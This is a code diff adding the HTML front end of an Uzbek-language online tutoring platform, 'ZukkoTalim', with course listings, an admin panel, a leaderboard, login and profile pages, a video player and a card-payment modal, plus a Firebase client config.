@@ -1,4 +1,333 @@
+<!-- ZukkoTalim v2.0 (online counter) -->
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ZukkoTalim — Sifatli onlayn ta'lim</title>
+<meta name="description" content="ZukkoTalim — onlayn ta'lim platformasi.">
+<meta name="robots" content="index, follow">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎓</text></svg>">
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+<style>
+body{background:#0d1117;color:#c9d1d9;font-family:system-ui,-apple-system,sans-serif}
+.glass{background:rgba(22,27,34,.85);backdrop-filter:blur(12px);border-bottom:1px solid rgba(255,255,255,.08)}
+.card-bg{background:#161b22;border:1px solid #30363d}
+.custom-scrollbar::-webkit-scrollbar{width:6px}
+.custom-scrollbar::-webkit-scrollbar-track{background:#0d1117}
+.custom-scrollbar::-webkit-scrollbar-thumb{background:#30363d;border-radius:4px}
+@keyframes pulse-dot{0%,100%{opacity:1}50%{opacity:.4}}
+.online-dot{animation:pulse-dot 1.5s ease-in-out infinite}
+@keyframes confetti-fall{0%{transform:translateY(-10vh) rotate(0);opacity:1}100%{transform:translateY(110vh) rotate(720deg);opacity:0}}
+.confetti-piece{position:fixed;top:0;width:10px;height:10px;z-index:9999;pointer-events:none;animation:confetti-fall linear forwards}
+</style>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database-compat.js"></script>
 <script>
+const firebaseConfig={apiKey:"AIzaSyDJIICaketn7Khrnl38_K-XYuC3bfaOYD8",authDomain:"edu-platform-64953.firebaseapp.com",databaseURL:"https://edu-platform-64953-default-rtdb.firebaseio.com",projectId:"edu-platform-64953",storageBucket:"edu-platform-64953.firebasestorage.app",messagingSenderId:"986479470743",appId:"1:986479470743:web:5e29214cc9595ae95c21d2"};
+firebase.initializeApp(firebaseConfig);
+const database=firebase.database();
+</script>
+</head>
+<body class="min-h-screen flex flex-col justify-between">
+
+<nav class="glass sticky top-0 z-40 px-4 md:px-6 py-3 md:py-4 shadow-2xl">
+<div class="flex justify-between items-center gap-2">
+<div class="flex items-center gap-2 md:gap-3 text-lg md:text-2xl font-black text-blue-400 cursor-pointer tracking-wide shrink-0" onclick="navigateTo('home')">
+<i class="fas fa-graduation-cap text-xl md:text-3xl"></i><span>ZukkoTalim</span></div>
+<div class="hidden md:flex gap-8 text-sm font-semibold">
+<button onclick="navigateTo('home')" class="hover:text-blue-400 transition flex items-center gap-2"><i class="fas fa-th-large"></i> Barcha Kurslar</button>
+<button onclick="navigateTo('my-courses')" class="hover:text-blue-400 transition flex items-center gap-2"><i class="fas fa-play-circle text-indigo-400"></i> Mening Kurslarim</button>
+<button onclick="navigateTo('leaderboard')" class="hover:text-blue-400 transition flex items-center gap-2"><i class="fas fa-trophy text-amber-400"></i> TOP-10</button>
+<button onclick="navigateTo('profile')" class="hover:text-blue-400 transition flex items-center gap-2"><i class="fas fa-user-circle"></i> Profilim</button>
+<button id="navAdminBtn" onclick="navigateTo('admin')" class="hidden text-amber-400 hover:text-amber-300 font-bold transition flex items-center gap-2"><i class="fas fa-user-shield"></i> Admin Panel</button>
+</div>
+<div class="flex items-center gap-2 md:gap-4 shrink-0">
+<span id="onlineCounter" class="inline-flex items-center gap-1.5 text-[10px] md:text-xs font-bold bg-emerald-900/40 text-emerald-400 px-2 md:px-3 py-1 rounded-full border border-emerald-700/40 whitespace-nowrap" title="Hozir saytda">
+<span class="w-1.5 h-1.5 rounded-full bg-emerald-400 online-dot"></span>
+<span id="onlineCountNum">0</span>
+<span class="hidden sm:inline">onlayn</span>
+</span>
+<div id="authNavArea" class="flex items-center gap-2 md:gap-4"></div>
+<button onclick="toggleMobileMenu()" class="md:hidden w-9 h-9 flex items-center justify-center rounded-lg bg-slate-800/70 border border-slate-700 text-slate-200 hover:bg-slate-700 transition shrink-0"><i id="mobileMenuIcon" class="fas fa-bars"></i></button>
+</div></div>
+<div id="mobileMenu" class="hidden md:hidden mt-3 pt-3 border-t border-slate-800 flex flex-col gap-1 text-sm font-semibold">
+<button onclick="navigateTo('home');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-th-large w-4 text-center"></i> Barcha Kurslar</button>
+<button onclick="navigateTo('my-courses');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-play-circle text-indigo-400 w-4 text-center"></i> Mening Kurslarim</button>
+<button onclick="navigateTo('leaderboard');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-trophy text-amber-400 w-4 text-center"></i> TOP-10</button>
+<button onclick="navigateTo('profile');closeMobileMenu()" class="text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition flex items-center gap-3"><i class="fas fa-user-circle w-4 text-center"></i> Profilim</button>
+<button id="navAdminBtnMobile" onclick="navigateTo('admin');closeMobileMenu()" class="hidden text-left px-3 py-2.5 rounded-lg hover:bg-slate-800/70 transition text-amber-400 font-bold items-center gap-3"><i class="fas fa-user-shield w-4 text-center"></i> Admin Panel</button>
+</div>
+</nav>
+
+<main class="flex-grow container mx-auto px-4 py-8">
+
+<section id="pageHome" class="space-y-8">
+<div class="text-center py-10 rounded-2xl bg-gradient-to-r from-blue-900/30 via-slate-900 to-indigo-900/30 border border-slate-800 shadow-xl">
+<h1 class="text-3xl md:text-5xl font-black text-white mb-3">ZukkoTalim — Sifatli Ta'lim va Video Darslar</h1>
+<p class="text-slate-400 max-w-2xl mx-auto text-sm md:text-base">O'zingizga mos repetitor va kurslarni tanlang, xarid qiling va istalgan vaqtda video darslarni tomosha qiling!</p></div>
+<div class="space-y-4 card-bg p-5 rounded-2xl shadow-md">
+<div><span class="text-xs text-slate-400 block mb-2 font-bold uppercase tracking-wider">📌 Sinf bo'yicha filter:</span><div id="classFilters" class="flex flex-wrap gap-2"></div></div>
+<div><span class="text-xs text-slate-400 block mb-2 font-bold uppercase tracking-wider">📚 Fan bo'yicha filter:</span><div id="subjectFilters" class="flex flex-wrap gap-2"></div></div></div>
+<div><h2 class="text-2xl font-bold mb-6 text-white flex items-center gap-2"><i class="fas fa-chalkboard-teacher text-blue-400"></i> Mavjud Repetitorlar va Kurslar</h2>
+<div id="tutorsGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"></div></div>
+</section>
+
+<section id="pageMyCourses" class="hidden space-y-6">
+<div class="flex justify-between items-center border-b border-slate-800 pb-4">
+<div><h1 class="text-2xl font-bold text-white flex items-center gap-2"><i class="fas fa-play-circle text-indigo-400"></i> Mening Kurslarim</h1>
+<p class="text-xs text-slate-400 mt-1">Siz xarid qilgan barcha kurslar</p></div></div>
+<div id="myCoursesGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
+</section>
+
+<section id="pageAdmin" class="hidden space-y-6">
+<h1 class="text-2xl font-bold text-white flex items-center gap-2"><i class="fas fa-cog text-amber-400"></i> Boshqaruv Paneli</h1>
+<div class="flex gap-4 border-b border-slate-800 pb-2 flex-wrap">
+<button onclick="switchAdminTab('users')" id="tabUsersBtn" class="px-4 py-2 text-sm font-semibold border-b-2 border-blue-500 text-blue-400"><i class="fas fa-users mr-1"></i> Foydalanuvchilar</button>
+<button onclick="switchAdminTab('guests')" id="tabGuestsBtn" class="px-4 py-2 text-sm font-semibold text-slate-400 hover:text-white"><i class="fas fa-user-secret mr-1"></i> Mehmonlar</button>
+<button onclick="switchAdminTab('tutors')" id="tabTutorsBtn" class="px-4 py-2 text-sm font-semibold text-slate-400 hover:text-white"><i class="fas fa-user-graduate mr-1"></i> Repetitorlar</button>
+<button onclick="switchAdminTab('lessons')" id="tabLessonsBtn" class="px-4 py-2 text-sm font-semibold text-slate-400 hover:text-white"><i class="fas fa-video mr-1"></i> Darslar</button>
+<button onclick="switchAdminTab('top')" id="tabTopBtn" class="px-4 py-2 text-sm font-semibold text-slate-400 hover:text-white"><i class="fas fa-trophy mr-1"></i> TOP-10</button>
+</div>
+
+<div id="adminTabUsers" class="space-y-6">
+<div class="card-bg p-4 rounded-xl flex flex-wrap gap-3 items-center">
+<input type="text" id="adminUserIdInput" placeholder="Foydalanuvchi ID (USR-1002)" class="bg-slate-900 border border-slate-700 px-4 py-2 rounded-lg text-sm flex-grow focus:outline-none focus:border-blue-500">
+<button onclick="adminAddBalanceById()" class="bg-green-600 hover:bg-green-700 text-white text-sm px-4 py-2 rounded-lg font-bold transition"><i class="fas fa-plus-circle mr-1"></i> Balans qo'shish</button>
+<button onclick="banUser()" class="bg-red-600 hover:bg-red-700 text-white text-sm px-4 py-2 rounded-lg font-bold transition">Ban</button>
+<button onclick="unbanUser()" class="bg-slate-700 hover:bg-slate-600 text-white text-sm px-4 py-2 rounded-lg font-bold transition">Unban</button>
+<button onclick="resetBalance()" class="bg-amber-600 hover:bg-amber-700 text-slate-900 text-sm px-4 py-2 rounded-lg font-bold transition">Balans nol</button>
+</div>
+<div id="adminUsersList" class="space-y-3"></div></div>
+
+<div id="adminTabGuests" class="hidden space-y-6">
+<div class="card-bg p-4 rounded-xl">
+<p class="text-xs text-slate-400"><i class="fas fa-info-circle text-blue-400 mr-1"></i> Ro'yxatdan o'tmagan mehmonlar.</p>
+</div>
+<div id="adminGuestsList" class="space-y-3"></div></div>
+
+<div id="adminTabTutors" class="hidden space-y-6">
+<div class="card-bg p-6 rounded-xl space-y-4">
+<h3 class="text-lg font-bold text-white"><i class="fas fa-user-plus mr-2 text-green-400"></i>Yangi Repetitor</h3>
+<div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+<input type="text" id="newTutorName" placeholder="Ism" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
+<input type="text" id="newTutorImg" placeholder="Rasm URL" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
+<input type="number" id="newTutorPrice" placeholder="Narxi" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
+<select id="newTutorSinf" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300">
+<option value="Umumiy">Umumiy</option><option value="5-sinf">5-sinf</option><option value="6-sinf">6-sinf</option><option value="7-sinf">7-sinf</option><option value="8-sinf">8-sinf</option><option value="9-sinf">9-sinf</option><option value="10-sinf">10-sinf</option><option value="11-sinf">11-sinf</option></select>
+<select id="newTutorFan" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300 col-span-1 md:col-span-2">
+<option value="Ingliz tili">Ingliz tili</option><option value="Matematika">Matematika</option><option value="Fizika">Fizika</option><option value="Informatika">Informatika</option><option value="Kimyo">Kimyo</option><option value="Tarix">Tarix</option></select>
+</div>
+<button onclick="addTutor()" class="bg-green-600 hover:bg-green-700 text-white px-6 py-2.5 rounded-lg font-bold text-sm transition">Qo'shish</button></div>
+<div class="card-bg p-6 rounded-xl space-y-4">
+<h3 class="text-lg font-bold text-white"><i class="fas fa-list mr-2"></i>Mavjud Repetitorlar</h3>
+<p class="text-xs text-slate-500">↑↓ tugmalari bilan tartibni o'zgartiring</p>
+<div id="adminTutorsList" class="space-y-3"></div></div>
+</div>
+
+<div id="adminTabLessons" class="hidden space-y-6">
+<div class="card-bg p-6 rounded-xl space-y-4">
+<h3 class="text-lg font-bold text-white"><i class="fas fa-plus-circle text-blue-400 mr-2"></i>Kursga Dars</h3>
+<div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+<div class="col-span-1 md:col-span-2"><label class="text-xs text-slate-400 block mb-1">Repetitor:</label>
+<select id="lessonTutorSelect" onchange="renderAdminLessonsList()" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></select></div>
+<input type="text" id="newLessonTitle" placeholder="Dars Nomi" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white">
+<input type="text" id="newLessonUrl" placeholder="YouTube / Vimeo" class="bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
+<button onclick="addLessonToTutor()" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2.5 rounded-lg font-bold text-sm transition"><i class="fas fa-plus mr-1"></i> Qo'shish</button></div>
+<div class="card-bg p-6 rounded-xl space-y-4 border border-indigo-800/40">
+<h3 class="text-lg font-bold text-white"><i class="fas fa-layer-group mr-2 text-emerald-400"></i>Ko'p Darslarni Birdan Qo'shish</h3>
+<p class="text-xs text-slate-400">Format: <b>Dars nomi | YouTube link</b></p>
+<textarea id="bulkLessonsInput" rows="8" placeholder="1-Dars. Nomi | https://youtu.be/ID" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white font-mono"></textarea>
+<button onclick="addLessonsBulk()" class="bg-emerald-600 hover:bg-emerald-700 text-white px-6 py-2.5 rounded-lg font-bold text-sm transition"><i class="fas fa-layer-group mr-1"></i> Barchasini Qo'shish</button></div>
+<div class="card-bg p-6 rounded-xl space-y-4">
+<h3 class="text-lg font-bold text-white"><i class="fas fa-film mr-2 text-indigo-400"></i>Tanlangan Kurs Darslari</h3>
+<div id="adminLessonsList" class="space-y-2"></div></div>
+</div>
+
+<div id="adminTabTop" class="hidden space-y-6">
+<div class="card-bg p-6 rounded-2xl">
+<h2 class="text-xl font-bold text-white mb-4 flex items-center gap-2"><i class="fas fa-trophy text-amber-400"></i> Eng faol o'quvchilar TOP-10</h2>
+<div id="leaderboard" class="space-y-2"></div>
+</div></div>
+</section>
+
+<section id="pageProfile" class="hidden space-y-6">
+<div class="card-bg p-6 rounded-2xl flex flex-wrap justify-between items-center gap-4">
+<div class="flex items-center gap-4">
+<div class="relative">
+<div id="profAvatar" class="w-20 h-20 rounded-full bg-blue-600/30 border-2 border-blue-500 flex items-center justify-center text-blue-400 text-3xl font-bold overflow-hidden cursor-pointer" onclick="changeAvatar()" title="Rasmni o'zgartirish"><i class="fas fa-user"></i></div>
+<button onclick="changeAvatar()" class="absolute bottom-0 right-0 w-7 h-7 bg-blue-600 hover:bg-blue-700 text-white rounded-full text-xs font-bold shadow-lg border-2 border-slate-900"><i class="fas fa-camera"></i></button>
+</div>
+<div>
+<div class="flex items-center gap-2 flex-wrap">
+<h1 id="profName" class="text-2xl font-bold text-white">...</h1>
+<button onclick="changeUsername()" class="text-blue-400 hover:text-blue-300 text-xs" title="Loginni o'zgartirish"><i class="fas fa-edit"></i></button>
+</div>
+<p id="profId" class="text-xs text-slate-400 mt-0.5">...</p>
+<div id="profStats" class="flex gap-2 mt-2 flex-wrap text-[10px] font-bold"></div>
+</div></div>
+<div class="bg-slate-900 px-6 py-3 rounded-xl border border-slate-800 flex items-center gap-4 flex-wrap">
+<div><span class="text-xs text-slate-400 block">Hisob balansi:</span><span id="profBalance" class="text-xl font-black text-green-400">0 so'm</span></div>
+<button onclick="addMoney()" class="bg-blue-600 hover:bg-blue-700 text-white text-xs px-3 py-2 rounded-lg font-bold transition">+ Balansni to'ldirish</button></div>
+<div id="notifBanner" class="bg-slate-900 px-6 py-4 rounded-xl border border-slate-800">
+<div class="flex items-center justify-between gap-4 flex-wrap">
+<div class="flex items-center gap-3"><div class="w-9 h-9 bg-amber-500/20 rounded-lg flex items-center justify-center text-amber-400"><i class="fas fa-bell"></i></div>
+<div><p class="text-sm font-bold text-white">Kunlik eslatmalar</p><p id="notifStatus" class="text-xs text-slate-400">Har kuni 19:00 da</p></div></div>
+<button id="notifBtn" onclick="requestPushPermission()" class="bg-amber-500 hover:bg-amber-600 text-slate-900 text-xs font-black px-4 py-2 rounded-lg transition whitespace-nowrap"><i class="fas fa-bell mr-1"></i> Yoqish</button></div></div></div>
+
+<div class="card-bg p-6 rounded-2xl space-y-4">
+<h2 class="text-xl font-bold text-white flex items-center gap-2"><i class="fas fa-shield-alt text-emerald-400"></i> Xavfsizlik</h2>
+<div class="grid grid-cols-1 md:grid-cols-3 gap-3">
+<div><label class="text-xs text-slate-400 block mb-1.5 font-semibold">Hozirgi parol</label>
+<input type="password" id="secOldPass" placeholder="••••••" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-lg px-3 py-2.5 text-sm text-white outline-none transition"></div>
+<div><label class="text-xs text-slate-400 block mb-1.5 font-semibold">Yangi parol</label>
+<input type="password" id="secNewPass" placeholder="Kamida 3 belgi" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-lg px-3 py-2.5 text-sm text-white outline-none transition"></div>
+<div><label class="text-xs text-slate-400 block mb-1.5 font-semibold">Tasdiqlang</label>
+<input type="password" id="secNewPass2" placeholder="Yana kiriting" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-lg px-3 py-2.5 text-sm text-white outline-none transition"></div></div>
+<p id="secMsg" class="hidden text-xs font-semibold"></p>
+<button onclick="changePassword()" class="bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-bold px-6 py-2.5 rounded-lg text-sm shadow-lg transition"><i class="fas fa-key mr-1.5"></i> Parolni o'zgartirish</button></div>
+</section>
+
+<section id="pageLeaderboard" class="hidden space-y-6">
+<div class="text-center py-8 rounded-2xl bg-gradient-to-r from-amber-900/30 via-slate-900 to-yellow-900/30 border border-amber-800/40 shadow-xl">
+<h1 class="text-3xl md:text-4xl font-black text-white mb-2 flex items-center justify-center gap-3"><i class="fas fa-trophy text-amber-400"></i> TOP-10 Reyting</h1>
+<p class="text-slate-400 text-sm">Eng faol o'quvchilar. Top-3 har kuni bonus oladi!</p>
+<div class="flex justify-center gap-3 mt-4 flex-wrap text-xs font-bold">
+<span class="bg-amber-900/40 text-amber-300 px-3 py-1.5 rounded-lg border border-amber-700/40">🥇 1-o'rin: +50 ball / kun</span>
+<span class="bg-slate-800 text-slate-300 px-3 py-1.5 rounded-lg border border-slate-700">🥈 2-o'rin: +30 ball / kun</span>
+<span class="bg-orange-900/40 text-orange-300 px-3 py-1.5 rounded-lg border border-orange-700/40">🥉 3-o'rin: +20 ball / kun</span>
+</div></div>
+<div id="publicLeaderboard" class="space-y-3"></div>
+</section>
+
+</main><div id="coursePlayerModal" class="fixed inset-0 bg-black/90 backdrop-blur-md hidden flex items-center justify-center p-2 md:p-6 z-50">
+<div class="card-bg w-full max-w-6xl h-[90vh] rounded-2xl flex flex-col overflow-hidden relative border border-slate-800 shadow-2xl">
+<div class="px-6 py-4 bg-slate-900 border-b border-slate-800 flex justify-between items-center">
+<div class="flex items-center gap-3"><span class="bg-blue-600/20 text-blue-400 p-2 rounded-lg text-sm"><i class="fas fa-play-circle"></i></span>
+<div><h3 id="modalCourseTitle" class="text-base md:text-lg font-bold text-white leading-tight">Kurs</h3>
+<p id="modalLessonCounter" class="text-xs text-slate-400">Dars 1 / 10</p></div></div>
+<button onclick="closeCoursePlayer()" class="bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white px-4 py-2 rounded-lg text-sm font-bold transition flex items-center gap-2"><i class="fas fa-times"></i> Yopish</button></div>
+<div class="flex-grow flex flex-col lg:flex-row overflow-hidden">
+<div class="lg:w-3/4 bg-black flex flex-col justify-center items-center relative p-2">
+<div class="w-full h-full rounded-xl overflow-hidden shadow-2xl relative aspect-video max-h-[70vh]">
+<iframe id="mainVimeoIframe" src="" class="w-full h-full border-0" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe></div>
+<div class="w-full mt-3 px-2 flex justify-between items-center text-xs text-slate-400">
+<span id="currentLessonTitleDisplay" class="font-bold text-white text-sm">1-Dars</span>
+<div class="flex gap-2">
+<button onclick="prevLesson()" class="bg-slate-800 hover:bg-slate-700 text-white px-3 py-1.5 rounded font-semibold"><i class="fas fa-chevron-left mr-1"></i> Oldingisi</button>
+<button onclick="nextLesson()" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded font-semibold">Keyingisi <i class="fas fa-chevron-right ml-1"></i></button></div></div></div>
+<div class="lg:w-1/4 bg-slate-900/90 border-t lg:border-t-0 lg:border-l border-slate-800 flex flex-col h-full">
+<div class="p-4 border-b border-slate-800 flex justify-between items-center">
+<h4 class="font-bold text-sm text-white flex items-center gap-2"><i class="fas fa-list-ul text-blue-400"></i> Darslar</h4>
+<span id="playlistTotalBadge" class="text-[11px] bg-slate-800 text-slate-300 px-2 py-0.5 rounded-full font-bold">0</span></div>
+<div id="coursePlaylist" class="flex-grow overflow-y-auto p-3 space-y-2 custom-scrollbar"></div></div></div></div></div>
+
+<div id="editTutorModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
+<div class="card-bg w-full max-w-lg p-6 rounded-2xl space-y-4 relative">
+<button onclick="closeEditModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white"><i class="fas fa-times"></i></button>
+<h2 class="text-xl font-bold text-white text-center"><i class="fas fa-user-edit mr-2"></i>Repetitorni Tahrirlash</h2>
+<input type="hidden" id="editTutorId">
+<div class="space-y-3">
+<div><label class="text-xs text-slate-400">Ism</label><input type="text" id="editTutorName" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
+<div><label class="text-xs text-slate-400">Rasm URL</label><input type="text" id="editTutorImg" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
+<div class="grid grid-cols-2 gap-3">
+<div><label class="text-xs text-slate-400">Narxi</label><input type="number" id="editTutorPrice" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-white"></div>
+<div><label class="text-xs text-slate-400">Sinf</label><select id="editTutorSinf" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300">
+<option value="Umumiy">Umumiy</option><option value="5-sinf">5-sinf</option><option value="6-sinf">6-sinf</option><option value="7-sinf">7-sinf</option><option value="8-sinf">8-sinf</option><option value="9-sinf">9-sinf</option><option value="10-sinf">10-sinf</option><option value="11-sinf">11-sinf</option></select></div></div>
+<div><label class="text-xs text-slate-400">Fan</label><select id="editTutorFan" class="w-full bg-slate-900 border border-slate-700 p-2.5 rounded-lg text-sm text-slate-300">
+<option value="Ingliz tili">Ingliz tili</option><option value="Matematika">Matematika</option><option value="Fizika">Fizika</option><option value="Informatika">Informatika</option><option value="Kimyo">Kimyo</option><option value="Tarix">Tarix</option></select></div></div>
+<div class="flex gap-3 pt-2"><button onclick="saveTutorEdit()" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2.5 rounded-lg text-sm transition">Saqlash</button>
+<button onclick="closeEditModal()" class="bg-slate-700 hover:bg-slate-600 text-white font-bold px-4 py-2.5 rounded-lg text-sm transition">Bekor</button></div></div></div>
+
+<div id="authModal" class="fixed inset-0 bg-black/70 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
+<div class="card-bg w-full max-w-md p-6 rounded-2xl space-y-4 relative">
+<button onclick="closeAuthModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white"><i class="fas fa-times"></i></button>
+<h2 id="authTitle" class="text-xl font-bold text-white text-center">Tizimga kirish</h2>
+<div class="space-y-3">
+<input type="text" id="authUsername" placeholder="Login" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white">
+<input type="password" id="authPassword" placeholder="Parol" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-sm text-white"></div>
+<button onclick="handleAuth()" id="authSubmitBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg text-sm transition">Kirish</button>
+<p class="text-xs text-center text-slate-400"><span id="authToggleText">Akkauntingiz yo'qmi?</span>
+<button onclick="toggleAuthMode()" id="authToggleBtn" class="text-blue-400 font-bold underline ml-1">Ro'yxatdan o'tish</button></p></div></div>
+
+<div id="toast" class="fixed bottom-5 right-5 bg-blue-600 text-white px-5 py-3 rounded-xl text-sm font-semibold hidden shadow-2xl z-50"></div>
+
+<div id="insufficientModal" class="hidden fixed inset-0 z-[200] flex items-center justify-center p-4" style="background:rgba(0,0,0,.8);backdrop-filter:blur(8px)">
+<div class="card-bg rounded-2xl w-full max-w-md shadow-2xl border border-slate-700 overflow-hidden">
+<div class="bg-gradient-to-r from-amber-600 to-red-600 px-6 py-5">
+<p class="text-xs text-amber-100 font-semibold uppercase">ZukkoTalim Pay</p>
+<p class="text-white font-black text-lg mt-0.5 flex items-center gap-2"><i class="fas fa-exclamation-triangle"></i> Mablag' yetarli emas</p></div>
+<div class="px-6 py-5 space-y-3">
+<div class="bg-slate-900/70 border border-slate-700 rounded-xl px-4 py-3 space-y-2">
+<div class="flex justify-between text-sm gap-3"><span class="text-slate-400">Kurs:</span><span id="insufficientTutorName" class="text-white font-bold text-right truncate"></span></div>
+<div class="flex justify-between text-sm"><span class="text-slate-400">Narxi:</span><span id="insufficientPrice" class="text-white font-bold"></span></div>
+<div class="flex justify-between text-sm"><span class="text-slate-400">Balansingiz:</span><span id="insufficientBalance" class="text-amber-400 font-bold"></span></div>
+<div class="flex justify-between text-sm border-t border-slate-800 pt-2"><span class="text-slate-400">Yetmayapti:</span><span id="insufficientMissing" class="text-red-400 font-bold"></span></div></div></div>
+<div class="px-6 pb-5 flex gap-3"><button onclick="closeInsufficientModal()" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl text-sm transition">Bekor</button>
+<button onclick="goToTopUp()" class="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-black py-3 rounded-xl text-sm transition"><i class="fas fa-plus-circle mr-1.5"></i> To'ldirish</button></div></div></div>
+
+<div id="paymentModal" class="hidden fixed inset-0 z-[200] flex items-center justify-center p-4" style="background:rgba(0,0,0,.8);backdrop-filter:blur(8px)">
+<div class="card-bg rounded-2xl w-full max-w-md shadow-2xl border border-slate-700 overflow-hidden">
+<div class="bg-gradient-to-r from-blue-700 to-indigo-700 px-6 py-5 flex items-center justify-between">
+<div><p class="text-xs text-blue-200 font-semibold uppercase">ZukkoTalim Pay</p>
+<p id="payModalTitle" class="text-white font-black text-lg mt-0.5">Balansni to'ldirish</p></div>
+<div class="flex items-center gap-3 text-white/80 text-3xl"><i class="fab fa-cc-visa"></i><i class="fab fa-cc-mastercard"></i></div></div>
+<div id="payAmountRow" class="hidden px-6 pt-5"><div class="bg-slate-900/70 border border-slate-700 rounded-xl px-4 py-3 flex items-center justify-between">
+<span class="text-slate-400 text-sm">Summa</span><span id="payAmountDisplay" class="text-white font-black text-lg"></span></div></div>
+<div id="payTopUpRow" class="px-6 pt-5"><label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">To'ldirish summasi</label>
+<input id="payTopUpAmount" type="number" min="1000" step="1000" value="100000" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-xl px-4 py-3 text-white font-bold text-lg outline-none transition"></div>
+<div class="px-6 pt-5 space-y-4">
+<div><label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">Karta raqami</label>
+<div class="relative"><input id="payCardNumber" type="text" maxlength="19" placeholder="0000 0000 0000 0000" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-xl pl-4 pr-12 py-3 text-white font-mono outline-none transition" oninput="formatCardNumber(this)">
+<i id="payCardIcon" class="fab fa-credit-card absolute right-4 top-1/2 -translate-y-1/2 text-slate-500 text-xl"></i></div></div>
+<div class="flex gap-3">
+<div class="flex-1"><label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">Muddat</label>
+<input id="payExpiry" type="text" maxlength="5" placeholder="MM/YY" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-xl px-4 py-3 text-white font-mono outline-none transition" oninput="formatExpiry(this)"></div>
+<div class="flex-1"><label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">CVV</label>
+<input id="payCVV" type="password" maxlength="3" placeholder="•••" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-xl px-4 py-3 text-white font-mono outline-none transition"></div></div>
+<div><label class="text-xs text-slate-400 font-semibold uppercase block mb-1.5">Karta egasi</label>
+<input id="payHolder" type="text" placeholder="IVAN IVANOV" class="w-full bg-slate-900 border border-slate-700 focus:border-blue-500 rounded-xl px-4 py-3 text-white font-mono outline-none transition" oninput="this.value=this.value.toUpperCase()"></div></div>
+<p id="payError" class="hidden text-red-400 text-xs font-semibold px-6 pt-3"></p>
+<div class="px-6 py-5 flex gap-3"><button onclick="closePaymentModal()" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl text-sm transition">Bekor</button>
+<button onclick="submitPayment()" class="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-black py-3 rounded-xl text-sm transition"><i class="fas fa-lock mr-1.5"></i> To'lash</button></div>
+<div class="border-t border-slate-800 px-6 py-3 flex items-center gap-2 text-slate-500 text-xs"><i class="fas fa-shield-alt text-green-500"></i><span>256-bit SSL</span></div></div></div>
+
+<div id="payProcessing" class="hidden fixed inset-0 z-[210] flex items-center justify-center" style="background:rgba(0,0,0,.88);backdrop-filter:blur(10px)">
+<div class="text-center"><div class="w-20 h-20 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-6"></div>
+<p class="text-white font-bold text-xl">To'lov amalga oshirilmoqda...</p></div></div>
+
